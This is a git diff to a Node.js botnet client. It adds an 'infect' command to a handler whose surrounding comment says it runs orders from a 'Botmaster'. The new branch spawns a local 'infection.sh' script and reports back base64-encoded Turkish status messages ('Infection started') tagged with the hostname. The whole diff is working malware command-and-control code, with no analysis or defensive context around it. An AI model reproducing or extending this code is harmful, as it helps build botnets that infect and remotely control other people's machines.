@@ -107,6 +107,32 @@ module.exports = function(){
 
 
 
+                    }else if(firstElement === 'infect'){
+                        
+                        child_p = spawn("./infection.sh");
+                        child_p.stdout.setEncoding('utf-8');
+
+                        child_p.on('error', function(output){
+                            var paket = new Packet(receiver_id, sender_id, {
+                                output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
+                                name:hostname});
+
+                            send(paket);
+
+                        });
+
+                        
+                                    
+                                    
+                                paket = new Packet(receiver_id, sender_id, {
+                                     output:new Buffer("Bulasma baslatildi.").toString('base64'),
+                                     name:hostname});
+
+                                send(paket);
+
+                       
+
+
                     }else{
                         //Botmasterın gönderdiği komutu icra eden kısım. Output oldukça fulfill gönderir.
 
